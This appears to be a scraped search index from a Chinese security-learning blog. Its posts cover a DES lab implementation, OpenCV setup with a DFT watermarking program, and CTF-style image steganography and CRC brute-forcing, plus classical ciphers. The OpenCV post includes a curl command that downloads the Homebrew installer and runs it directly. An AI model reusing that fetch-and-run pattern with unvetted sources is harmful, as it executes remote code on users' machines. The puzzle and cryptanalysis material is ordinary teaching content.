;&#125;","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"密码学","slug":"实验/密码学","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"AES","slug":"AES","permalink":"https://gryffinbit.top/tags/AES/"}],"author":"Gryffinbit"},{"title":"DES实验报告","slug":"DES实验","date":"2020-11-14T18:53:19.000Z","updated":"2024-11-12T06:59:45.000Z","comments":true,"path":"2020/11/15/DES实验/","permalink":"https://gryffinbit.top/2020/11/15/DES%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"DES实验报告一、实验题目DES加密算法 二、实验目的和要求通过实验，掌握DES密码的程序实现，熟悉比特串的操作，矩阵变换，提高C++程序设计能力。 编写 DES 密码的加密解密程序，运行并验证。 (1) 输入 64 比特明文和密文，利用 DES 密码对其加密并输出密文。 (2) 输入 DES 加密的 64 比特密文和密钥，对其进行解密。 (3) 记录调试和验证过程，完成实验报告。 三、实验环境clion 四、实验内容DES 算法包括： (1)：一个初始置换 IP：重排明文分组的 64 比特数据 (2)：相同功能的 16 轮变换：每轮中都有置换和代换运算，第 16 轮变换的输出 分为左右两半，并被交换次序 (3)：经过一个逆初始置换 IP-1(为 IP 的逆)。最后产生 64 比特的密文。 给定的 DES 结构如图： 每轮的结构如图： 32 比特扩展 48 位， 轮密钥异或， S 盒代换（1，6 位合并选行，2-5 位合并选列）， 置换 P 轮密钥生成： 输入算法的 56 比特有效密钥: 1.首先经过一个置换运算（实际初始密钥共 64 位，去除 8 个校验位并且改变 顺序）， 2.然后将置换后的 56 比特分为各为 28 比特的𝐶𝐶0和𝐷𝐷0两半。第𝑖𝑖轮𝐶𝐶𝑖𝑖−1和𝐷𝐷𝑖𝑖−1，分别左循环移位。得到𝐶𝐶𝑖𝑖和和𝐷𝐷𝑖𝑖−1 做为求下一轮子密钥的输入，同时也输入置换选择 2。 3.置换选择 2 产生的 48 比特的 ，即为本轮的子密钥，输入函数。 验证操作 ： 选择进行文件加密，输入长度为 8 个字符的加解密的密钥，读入明文文件 1.txt，加密文件存储在 2.txt 文件中； 选择进行文件解密，输入长度为 8 个字符的加解密的密钥，读入密文文件 2.txt，解密文件存储在 3.txt 文件中。 五、算法描述及实验步骤准备部分的矩阵：初始置换IP，逆初始置换IP，E表，置换函数P。 F中的代换由8个S盒组成。64比特密钥进行第一轮置换选择，变为56比特的有效密钥。分成两组后，左移位，再进入置换选择2. 将字符转为二进制的形式，与密钥参与异或运算 DES明文处理的过程有三个阶段： 1.初始置换IP：重排明文分组的64比特数据 2.16轮变换：每轮中包含置换、代换。变换的输出被分为左右两组，被交换次序 3.逆初始置换IP，产生密文 DES密钥生成： 1.56比特密钥经过置换 2.将置换后的56比特，分为两组，Ci、Di。 3.第i轮Ci-1、Di-1分别左移位。得到的Ci、Di作为下一轮求子密钥的输入，同时输入置换选择2 4.置换选择2生成48比特子密钥Ki，输入到F函数 轮结构： $$L_i&#x3D;R_{i-1}$$ $$R_i&#x3D;L_{i-1}\\oplus F(R_{i-1},K_i)$$ F的处理过程： $$(R_{i-1}扩展&#x2F;置换（E表）\\oplus K_i)\\ 进入S盒，变为32比特。置换（P），$$ 六、调试过程及结果（附截图） 七、总结体会❓任选两个模块描述执行过程 ‼️明文的处理： 将字符转换为二进制，后面方便与密钥进行异或运算 1234567int ISD_DES_ByteToBit(ElemType ch, ElemType bit[8])&#123; int cnt; for(cnt = 0;cnt &lt; 8; cnt++)&#123; *(bit+cnt) = (ch&gt;&gt;cnt)&amp;1; &#125; return 0;&#125; 一字节长度为8比特：将其转换为二进制串 123456int ISD_DES_Char8ToBit64(ElemType ch[8],ElemType bit[64])&#123; int cnt; for(cnt = 0; cnt &lt; 8; cnt++)&#123; ISD_DES_ByteToBit(*(ch+cnt),bit+(cnt&lt;&lt;3)); &#125; return 0; ‼️明文的加密： 1.初始置换IP：重排明文分组的64比特数据 2.16轮变换：每轮中包含置换、代换。变换的输出被分为左右两组，被交换次序 3.逆初始置换IP，产生密文 1234567891011121314151617181920212223242526272829303132int ISD_DES_EncryptBlock(ElemType plainBlock[8], ElemType subKeys[16][48], ElemType cipherBlock[8])&#123; ElemType plainBits[64]; ElemType copyRight[48]; int cnt; ISD_DES_Char8ToBit64(plainBlock,plainBits); //初始置换（IP置换） ISD_DES_IP_Transform(plainBits); //16轮迭代 for(cnt = 0; cnt &lt; 16; cnt++)&#123; memcpy(copyRight,plainBits+32,32); //将右半部分进行扩展置换，从32位扩展到48位 ISD_DES_E_Transform(copyRight); //将右半部分与子密钥进行异或操作 ISD_DES_XOR(copyRight,subKeys[cnt],48); //异或结果进入S盒，输出32位结果 ISD_DES_SBOX(copyRight); //P置换 ISD_DES_P_Transform(copyRight); //将明文左半部分与右半部分进行异或 ISD_DES_XOR(plainBits,copyRight,32); if(cnt != 15)&#123; //最终完成左右部的交换 ISD_DES_Swap(plainBits,plainBits+32); &#125; &#125; //逆初始置换（IP^1置换） ISD_DES_IP_1_Transform(plainBits); ISD_DES_Bit64ToChar8(plainBits,cipherBlock); return 0;&#125;","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"密码学","slug":"实验/密码学","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"DES","slug":"DES","permalink":"https://gryffinbit.top/tags/DES/"}],"author":"Gryffinbit"},{"title":"OpenCv","slug":"OpenCv","date":"2020-11-14T17:47:14.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2020/11/15/OpenCv/","permalink":"https://gryffinbit.top/2020/11/15/OpenCv/","excerpt":"","text":"macOS下opencv的安装。在CLion上配置使用OpenCV （C++）安装opencv brew的安装 1/usr/bin/ruby -e &quot;$(curl -fsSL &lt;https://raw.githubusercontent.com/Homebrew/install/master/install&gt;)&quot; brew安装opencv 1brew install opencv 123456789101112cmake_minimum_required(VERSION 3.17)project(opencv)set(CMAKE_CXX_STANDARD 11)find_package(OpenCV REQUIRED)include_directories($&#123;OpenCV_INCLUDE_DIRS&#125;)add_executable(opencv main.cpp) target_link_libraries(opencv $&#123;OpenCV_LIBS&#125;) 123456cd &quot;$(brew --repo)&quot;git remote set-url origin &lt;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git&gt;cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot;git remote set-url origin &lt;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git&gt;cd brew update 12brew updatebrew install opencv 1brew install libav 1234567891011cmake_minimum_required(VERSION 3.17)project(watermark_C__14)find_package(OpenCV)include_directories($&#123;OpenCV_INCLUDE_DIRS&#125;)set(CMAKE_CXX_STANDARD 14)set(SOURCE_FILES main.cpp)add_executable(watermark_C__14 $&#123;SOURCE_FILES&#125;)target_link_libraries(watermark_C__14 $&#123;OpenCV_LIBS&#125;) # 链接库 1/usr/local/Cellar/gcc 1preferences &gt;&gt; Build,execution,deployment &gt;&gt; toolchains &gt;&gt; GCC 1brew install opencv@3 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;opencv2/opencv.hpp&gt; //调用 OpenCV 的库using namespace cv;int main()&#123; Mat image; // OpenCV 中图片格式为 Mat image = imread( &quot;要显示的图片路径.png&quot;); //读取图片 if( image.empty() ) //检查是否读取成功 &#123; std::cout &lt;&lt; &quot;Could not open or find the image&quot; &lt;&lt; std::endl ; return -1; &#125; imshow(&quot;demo&quot;,image); //显示图片 waitKey(); return 0;&#125; 12345678void test()&#123; std::cout &lt;&lt; CV_VERSION_MAJOR &lt;&lt; CV_VERSION_MINOR &lt;&lt; std::endl; std::cout &lt;&lt; cv::getBuildInformation().c_str() &lt;&lt; std::endl;&#125;int main()&#123; test();&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200#include &lt;stdlib.h&gt;#include &lt;opencv2/core/utility.hpp&gt;#include &lt;opencv2/tracking.hpp&gt;#include &lt;opencv2/videoio.hpp&gt;#include &lt;opencv2/highgui.hpp&gt;#include &quot;opencv2/imgproc/types_c.h&quot;using namespace cv;std::vector&lt;cv::Mat&gt; planes;cv::Mat complexImage;void shiftDFT(cv::Mat image)&#123; image = image(Rect(0, 0, image.cols &amp; -2, image.rows &amp; -2)); int cx = image.cols / 2; int cy = image.rows / 2; Mat q0 = Mat(image, Rect(0, 0, cx, cy)); Mat q1 = Mat(image, Rect(cx, 0, cx, cy)); Mat q2 = Mat(image, Rect(0, cy, cx, cy)); Mat q3 = Mat(image, Rect(cx, cy, cx, cy)); cv::Mat tmp = cv::Mat(); q0.copyTo(tmp); q3.copyTo(q0); tmp.copyTo(q3); q1.copyTo(tmp); q2.copyTo(q1); tmp.copyTo(q2);&#125;cv::Mat optimizeImageDim(cv::Mat image)&#123; // init cv::Mat padded; // get the optimal rows size for dft int addPixelRows = cv::getOptimalDFTSize(image.rows); // get the optimal cols size for dft int addPixelCols = cv::getOptimalDFTSize(image.cols); // apply the optimal cols and rows size to the image cv::copyMakeBorder(image, padded, 0, addPixelRows - image.rows, 0, addPixelCols - image.cols, cv::BORDER_CONSTANT, Scalar::all(0)); return padded;&#125;cv::Mat createOptimizedMagnitude(cv::Mat complexImage)&#123; // init std::vector&lt;cv::Mat&gt; newPlanes; cv::Mat mag = cv::Mat(); // split the comples image in two planes cv::split(complexImage, newPlanes); // compute the magnitude cv::magnitude(newPlanes[0], newPlanes[1], mag); // move to a logarithmic scale cv::add(cv::Mat::ones(mag.size(), CV_32F), mag, mag); cv::log(mag, mag); // optionally reorder the 4 quadrants of the magnitude image shiftDFT(mag); // normalize the magnitude image for the visualization since both JavaFX // and OpenCV need images with value between 0 and 255 // convert back to CV_8UC1 mag.convertTo(mag, CV_8UC1); cv::normalize(mag, mag, 0, 255, cv::NORM_MINMAX, CV_8UC1); return mag;&#125;cv::Mat transformImage(cv::Mat image)&#123; // planes??????????????,???. if (!planes.empty()) &#123; planes.clear(); &#125; // optimize the dimension of the loaded image cv::Mat padded = optimizeImageDim(image); padded.convertTo(padded, CV_32F); // prepare the image planes to obtain the complex image planes.push_back(padded); planes.push_back(cv::Mat::zeros(padded.size(), CV_32F)); // prepare a complex image for performing the dft cv::merge(planes, complexImage); // dft printf(&quot;complexImage types %d\\\\n&quot;, complexImage.type()); cv::dft(complexImage, complexImage); // optimize the image resulting from the dft operation cv::Mat magnitude = createOptimizedMagnitude(complexImage); planes.clear(); return magnitude;&#125;void transformImageWithText(cv::Mat image, String watermarkText, cv::Point point, double fontSize, Scalar scalar)&#123; // planes??????????????,???. if (!planes.empty()) &#123; planes.clear(); &#125; // optimize the dimension of the loaded image cv::Mat padded = optimizeImageDim(image); padded.convertTo(padded, CV_32F); printf(&quot;padded types %d CV_32FC1 %d\\\\n&quot;, padded.type(), CV_32F); // prepare the image planes to obtain the complex image planes.push_back(padded); planes.push_back(cv::Mat::zeros(padded.size(), CV_32F)); // prepare a complex image for performing the dft cv::merge(planes, complexImage); printf(&quot;complexImage types %d\\\\n&quot;, complexImage.type()); // dft cv::dft(complexImage, complexImage); // ???????? cv::putText(complexImage, watermarkText, point, cv::FONT_HERSHEY_DUPLEX, fontSize, scalar,2); cv::flip(complexImage, complexImage, -1); cv::putText(complexImage, watermarkText, point, cv::FONT_HERSHEY_DUPLEX, fontSize, scalar,2); cv::flip(complexImage, complexImage, -1); planes.clear();&#125;cv::Mat antitransformImage()&#123; cv::Mat invDFT = cv::Mat(); cv::idft(complexImage, invDFT, cv::DFT_SCALE | cv::DFT_REAL_OUTPUT, 0); cv::Mat restoredImage = cv::Mat(); invDFT.convertTo(restoredImage, CV_8U); planes.clear(); return restoredImage;&#125;int main(int argc, char* argv[])&#123; if (argc &lt; 3) &#123; printf(&quot;watermark enc/dec file_name\\\\n&quot;); &#125; else &#123; if (strcmp(argv[1], &quot;enc&quot;) == 0) &#123; //load image Point point(50, 100); Scalar scalar(0, 0, 0, 0); printf(&quot;read file %s\\\\n&quot;, argv[2]); cv::Mat img1 = cv::imread(argv[2], cv::IMREAD_GRAYSCALE); transformImageWithText(img1, &quot;shennug&quot;, point, 2.0, scalar); cv::Mat img2 = createOptimizedMagnitude(complexImage); cv::Mat img3 = antitransformImage(); cv::namedWindow(&quot;Matrix1&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix1&quot;, img1); cv::namedWindow(&quot;Matrix2&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix2&quot;, img2); cv::namedWindow(&quot;Matrix3&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix3&quot;, img3); cv::imwrite(&quot;1_orig.jpg&quot;, img1); cv::imwrite(&quot;1_watermark.jpg&quot;, img2); cv::waitKey(0); cv::destroyAllWindows(); &#125; if (strcmp(argv[1], &quot;dec&quot;) == 0) &#123; //load image Point point(50, 100); Scalar scalar(0, 0, 0, 0); printf(&quot;read file %s\\\\n&quot;, argv[2]); cv::Mat img1 = cv::imread(argv[2], cv::IMREAD_GRAYSCALE); transformImage(img1); cv::Mat img2 = createOptimizedMagnitude(complexImage); cv::Mat img3 = antitransformImage(); cv::namedWindow(&quot;Matrix1&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix1&quot;, img1); cv::namedWindow(&quot;Matrix2&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix2&quot;, img2); cv::imwrite(&quot;1_decode.jpg&quot;, img2); cv::waitKey(0); cv::destroyAllWindows(); &#125; &#125; return 1;&#125; 1ln -s -f /usr/local/bin/python3.8 /usr/local/bin/python ln -s -f &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pip3 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pip pip install opencv-python pip install -i https://pypi.tuna.tsinghua.edu.cn/simple opencv-python python不好用的加水印C++brew reinstall llvm Please note that, you can’t use gcc compiler on Mac-Sierra for your project which needs openMP and also openCV. You need to use llvm compiler. 报错排查 nm -g /usr/local/lib/libopencv_imgcodecs.dylib | grep imwrite 0000000000006223 T ZN2cv7imwriteERKNS_6StringERKNS_11_InputArrayERKNSt316vectorIiNS6_9allocatorIiEEEE nm -g main.o | grep imwrite &#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#x2F;usr&#x2F;bin&#x2F;nm: error: main.o: No such file or directory. 这个报错需要换个编译器解决 check compiler version app: 1/Applications/Clion.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang++ -v 1/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++ -v 换个编译器 And rebuild&#x2F;reinstall OpenCV with current version of compiler. library: opencv 测试成功显示 测试代码 指定brew的执行版本。 因为之前下载的是最新的版本4，所以要先解除4的链接 1brew unlink opencv@4 1brew link opencv@3 --force 1brew uninstall opencv 1opencv_version 最后检查一下现在的版本 tip: 版本3的名字是 卸载掉之前下载的（从brew下载的最新版本） 然后链接上版本3 回到cmake 1234567891011cmake_minimum_required(VERSION 3.17)project(watermark_C__14)find_package(OpenCV)include_directories($&#123;OpenCV_INCLUDE_DIRS&#125;)set(CMAKE_CXX_STANDARD 14)set(SOURCE_FILES main.cpp)add_executable(watermark_C__14 $&#123;SOURCE_FILES&#125;)target_link_libraries(watermark_C__14 $&#123;OpenCV_LIBS&#125;) # 链接库 然后就可以正常显示了 对clion重新加载，建议最好电脑重启一下。 先指定版本下载opencv3 opencv版本大概意思就是说 ‘imgcodecs‘仅opencv3+版本支持。然后我就发现应该是版本问题，根据这个启发。通过homebrew对opencv版本进行重新整理 It took me a week to solve this problem… I want to share my solution with you in detail so fewer people would get stuck with this situation.In my case, the problem lies in the conflict between opencv2 and opencv3. My ubuntu was installed with opencv 2.4.9 before by someone else, but I didn’t manage to find the build file of it and uninstall it. I learned somewhere that ‘imgcodecs’ only exists in opencv 3+, so I realized that caffe must have used opencv2 and then run into this mistake.I used cmake-gui to install opencv 3.4.3 (without clicking BUILD_opencv_world), and CMAKE_INSTALL_PREFIX was set to usr&#x2F;local&#x2F;opencv343 (whatever u like, just set to be separated from opencv2, which was installed in the default path). Then add usr&#x2F;local&#x2F;opencv343&#x2F;lib to ‘sudo gedit &#x2F;etc&#x2F;ld.so.conf.d&#x2F;opencv.conf’, and add ‘PKG_CONFIG_PATH&#x3D;$PKG_CONFIG_PATH:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;pkgconfig export PKG_CONFIG_PATH’ to ‘sudo gedit &#x2F;etc&#x2F;bash.bashrc’.Then put ‘usr&#x2F;local&#x2F;opencv343&#x2F;include’ and ‘usr&#x2F;local&#x2F;opencv343&#x2F;lib’ behind the ‘(PYTHON INCLUDE)’ and ‘(PYTHON LIB)’ in the makefile.config respectively (before other paths).This works for me, where my ubuntu has both opencv 2 and 3. Hope it would work for you guys too. 原话是这样的。 后来发现是opencv库的问题，在github上找到了一点启发 cannot find -lopencv_imgcodecs 运行又报错了 哦！天呐！顺滑顺滑顺滑！ brew 和 gcc都更新好，并且修改新路径后。 编译过程就变得崭新且如丝般顺滑～倍儿爽～ 查看自己的版本号，在Clion中修改complier路径 进入 Clion要修改配置，不然编译的时候可能会出现报错。gcc版本更新问题 cmake 将旧的安装包清理掉 brew cleanup brew 更新后可以用 提示出现了一点小报错，按照提示继续安装 于是我更换了homebrew镜像源。替换Homebrew源. 替换homebrew-core源. 我出现了Undefined symbols for architecture x86_64: 的报错 报错 通过pip安装 1sudo python3 -m pip install opencv-python 检验是否安装成功 在iterm下输入 python3 12import cv2print(cv2.__version__) 如果显示版本号则安装成功 python安装opencv库project的名字，自己命名，我这里取的是opencv。你自己命名后，要相应的修改cmake &quot;OpenCV 4.x+ requires enabled C++11 support&quot;![Screen Shot 2020-08-23 at 10.29.49 AM](/Users/KarlieLee/Library/Application Support/typora-user-images/Screen Shot 2020-08-23 at 10.29.49 AM.png) cmake文件配置 使用C++11标准 clion配置opencv环境要下载的包很多，慢慢等会。","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"图片","slug":"图片","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"}],"author":"Gryffinbit"},{"title":"CRC校验","slug":"CRC校验","date":"2020-11-14T17:39:10.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2020/11/15/CRC校验/","permalink":"https://gryffinbit.top/2020/11/15/CRC%E6%A0%A1%E9%AA%8C/","excerpt":"","text":"CRC检验错误pngcheck -v 分析png格式，报错CRC ERROR 对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。 而Linux、macOS下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况 png格式： 前八个字节 89 50 4E 47 0D 0A 1A 0A 为png的文件头， 该段格式是固定的 前四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13，数据块包含了png图片的宽高等信息，该段格式是固定的 之后的四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示，该段格式也是固定的 数据块格式（十三字节）： 00 00 05 8C 该四字节为图片的宽，该段数据是由图片的实际宽决定的 00 00 01 f4（ 00000406原图）该四字节为图片的高，该段数据是由图片的实际高度决定的 后五字节08 06 00 00 00 凑满十三字节，数据块 再往后四位是CRC校验码94F3FED1 校验码是由IHDR文件头标示与宽高共同计算出来的所以，一旦修改高或宽，便不符合校验码了，就会出错 爆破，找出正确的高可以选择爆破的方法，找出修改前的高度来匹配CRC校验码，用正确的宽高修复 1234567891011121314151617# -*- coding: utf-8 -*-import binasciiimport struct#\\x49\\x48\\x44\\x52\\x00\\x00\\x02\\xA7\\x00\\x00\\x01\\x00\\x08\\x06\\x00\\x00\\x00crc32key = 0x6D7C7135for i in range(0, 65535): height = struct.pack(&#x27;&gt;i&#x27;, i) #CRC: 6D7C7135 #把height的位置留出来，data减去四字节 data = &#x27;\\x49\\x48\\x44\\x52\\x00\\x00\\x02\\xA7&#x27; + height + &#x27;\\x08\\x06\\x00\\x00\\x00&#x27; crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print &#x27;&#x27;.join(map(lambda c: &quot;%02X&quot; % ord(c), height))","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"图片","slug":"图片","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"}],"author":"Gryffinbit"},{"title":"Jpegsnoop","slug":"Jpegsnoop","date":"2020-11-14T17:25:27.000Z","updated":"2024-11-12T06:59:34.000Z","comments":true,"path":"2020/11/15/Jpegsnoop/","permalink":"https://gryffinbit.top/2020/11/15/Jpegsnoop/","excerpt":"","text":"github 项目链接 https://github.com/ImpulseAdventure/JPEGsnoop 可参考jpeg的格式详解 JPEG原理简介文件格式 JPEG文件大体上可以分成两个部分：标记码和压缩数据 标记码： 由两个字节构成，第一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值 在每个标记码之前可以添加数目不限的无意义的0xFF填充，连续的多个0xFF可以被理解为一个0xFF，并表示一个标记码的开始 常见的标记码： SOI 0xD8 图像开始 APP0 0xE0 应用程序保留标记0 APPn 0xE1 - 0xEF 应用程序保留标记n(n&#x3D;1～15) DQT 0xDB 量化表(Define Quantization Table) SOF0 0xC0 帧开始(Start Of Frame) DHT 0xC4 定义Huffman表(Define Huffman Table) DRI 0XDD 定义差分编码累计复位的间隔(Define Restart Interval) SOS 0xDA 扫描开始(Start Of Scan) EOI 0xD9 图像结束 压缩数据： 前两个字节保存整个段的长度，包括这两个字节 注： 这个长度的表示方法按照高位在前，低位在后，与PNG文件的长度表示方法不同 例如长度是0x12AB，存储顺序为0x12，0xAB Jpegsnoop软件jpegsnoop的使用 看是否有注释，是否有info 最后一行，分析图片得到，在EOF数据块后有多余的内容，并且标注出了范围 根据这个范围，hex打开图片，得到一个base64（右侧） 转换base64，得到flag flag{hahahaha_is_so_funny}","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"图片","slug":"图片","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"}],"author":"Gryffinbit"},{"title":"stegdetect","slug":"stegdetect","date":"2020-11-14T17:18:25.000Z","updated":"2024-11-12T06:59:14.000Z","comments":true,"path":"2020/11/15/stegdetect/","permalink":"https://gryffinbit.top/2020/11/15/stegdetect/","excerpt":"","text":"在kali下 github项目 https://github.com/abeluck/stegdetect 原理简介文件格式 JPEG文件大体上可以分成两个部分：标记码和压缩数据 标记码： 由两个字节构成，第一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值 在每个标记码之前可以添加数目不限的无意义的0xFF填充，连续的多个0xFF可以被理解为一个0xFF，并表示一个标记码的开始 常见的标记码： SOI 0xD8 图像开始 APP0 0xE0 应用程序保留标记0 APPn 0xE1 - 0xEF 应用程序保留标记n(n&#x3D;1～15) DQT 0xDB 量化表(Define Quantization Table) SOF0 0xC0 帧开始(Start Of Frame) DHT 0xC4 定义Huffman表(Define Huffman Table) DRI 0XDD 定义差分编码累计复位的间隔(Define Restart Interval) SOS 0xDA 扫描开始(Start Of Scan) EOI 0xD9 图像结束 压缩数据： 前两个字节保存整个段的长度，包括这两个字节 注： 这个长度的表示方法按照高位在前，低位在后，与PNG文件的长度表示方法不同 例如长度是0x12AB，存储顺序为0x12，0xAB stegdetect看用什么工具修改加密过 显示有多出的34字节，hex打开后，定位，找到该多余的字节（给出在C0前有34字节无意义填充，可以数出来 C0指的是FFC0） 根据jpeg的格式，在每个标记码之前可以添加数目不限的无意义的0xFF填充， 所以我在FFD8开始～FFC0结束前，隐藏了一段payload。 得到一串十六进制数，当时题目给了提示2 or 3 推出 1. 其实是想给提示，这串数字，实际是十进制数，要把它先转换为十六进制数。最后转换成ascii码","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"图片","slug":"图片","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"}],"author":"Gryffinbit"},{"title":"常见编码","slug":"常见编码","date":"2020-11-14T17:01:14.000Z","updated":"2024-11-12T07:00:19.000Z","comments":true,"path":"2020/11/15/常见编码/","permalink":"https://gryffinbit.top/2020/11/15/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/","excerpt":"","text":"常见的编码##base64 长度是3的倍数，不足时结尾用&#x3D; 补全 ##xxencode 与base64相似。 但结尾用+ 补全 uuencode特殊符号很多 ##jjencode 针对JavaScript的编码方式 转换成只有符号的字符串 ##aaencode 针对JavaScript的编码方式 转换成常用的网络表情 ###维吉尼亚密码 由一些偏移量不同的凯撒密码组成。 （多表密码的简单形式） 加密过程： 密钥是由字母组成。 将密钥循环，形成密钥流，长度与明文一致 根据每位密钥对明文加密。例如，第一位密钥是L，对应第12个字母，所以偏移量为12-1&#x3D;11 所以第一位的明文加密规则为 （A+11）mod 26 即 偏移量为11的凯撒密码。 后面同理 http://atomcated.github.io/Vigenere/","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"古典密码","slug":"古典密码","permalink":"https://gryffinbit.top/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"}],"author":"Gryffinbit"},{"title":"维吉尼亚密码变体","slug":"维吉尼亚密码变体","date":"2020-11-14T16:57:09.000Z","updated":"2024-11-12T07:00:01.000Z","comments":true,"path":"2020/11/15/维吉尼亚密码变体/","permalink":"https://gryffinbit.top/2020/11/15/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81%E5%8F%98%E4%BD%93/","excerpt":"","text":"原题： It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)Tips:1.The encode pragram is given;2.Do u no index of coincidence ？3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction) 加密代码： 12345678910111213141516171819202122232425262728293031 #include &lt;stdio.h&gt; #define KEY_LENGTH 2 // Can be anything from 1 to 13main()&#123; unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = &#123;0x00, 0x00&#125;; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen(&quot;ptext.txt&quot;, &quot;r&quot;); fpOut = fopen(&quot;ctext.txt&quot;, &quot;w&quot;); i=0; while (fscanf(fpIn, &quot;%c&quot;, &amp;ch) != EOF) &#123; /* avoid encrypting newline characters */ /* In a &quot;real-world&quot; implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create &quot;production-quality&quot; code =) */ if (ch!=&#x27;\\\\n&#x27;) &#123; fprintf(fpOut, &quot;%02X&quot;, ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; &#125; &#125; fclose(fpIn); fclose(fpOut); return;&#125; 可以看出，这道题的加密方式是维吉尼亚密码的变体。 原先的维吉尼亚加密，是指定一个密钥，然后将密钥循环与原文中每一个字母对应，这个字母偏移密钥在字母表中的序号后的新字母即为最终结果。如图： 而这道题是用1到14个长度范围内，未知的密钥，一一，并且循环与明文异或，跳过换行符，将每一位异或的结果输出为两位16位数作为密文。与传统维吉尼亚偏移的加密方式相比，使用了异或的形式来加密原文。 维吉尼亚密码回顾要解这道题，先回顾传统维吉尼亚密码的解密形式。 我们知道，与凯撒密码不同之处在于，维吉尼亚密码中，一个字母可能生成几个不同的密文，因此，不能像凯撒密码那样用轮转密文的方法来破解维吉尼亚密码。要破解维吉尼亚密码，首先要理解到，虽然维吉尼亚密码打乱了字母与密文一一对应的关系，但同一位密钥所对应的不同密文，却有着相同的偏移量。也就是说，如果知道了密钥的长度，那每一位密钥所加密的那一组密文就像是凯撒密码那样有相同的偏移量。 所以如果能找出密钥的长度，那我们就能将密文分隔成几组由不同偏移量凯撒加密所形成的密文。 又有，在自然英语中，各个字母的使用频率不同，即一些字母使用频率高些，另一些字母使用频率低些。比如说，字母e的使用频率最高，约0.12，字母z的使用频率最低，为0.00074。据此，就可以分别统计出前述几组密文中各字母的出现频率，在对比自然英语字母的使用频率，然后就能猜测每一位密文所对应的原文。根据一组密文拥有相同的偏移量这一点，就可猜测出最终的密钥。 因而，解密维吉尼亚密码的第一步在于找出密钥的长度。只要找出了密钥的长度，就可以统计字频猜测具体密钥。 怎样才能求出密钥的长度？这里引入十分重要的一点，也是求解维吉尼亚密码的关键，即重合指数（index of coincidence）。重合指数是指，在一串字母中，任意取出两个字母，这两个字母相同的概率。例如，随机给出一串混乱的字母，它的重合指数总会在0.45附近，而一串有意义的英语段落，因为字母使用频率的影响，重合指数总是会在0.65附近，并且段落越长越接近这两个值。 易见的是，给一串字母相同的偏移量，并不会改变这串字母的重合指数。因此，通过同一位密钥加密而成的那一组维吉尼亚密文，因为它是有意义的段落，它的重合指数应该接近于自然英语的重合指数0.68。根据这一点，就可以猜测密钥的长度，再计算各个长度下密钥的重合指数（每个长度下的几组可以取均值），结果最接近0.68的那个结果，就可以大胆猜测是密钥的长度。 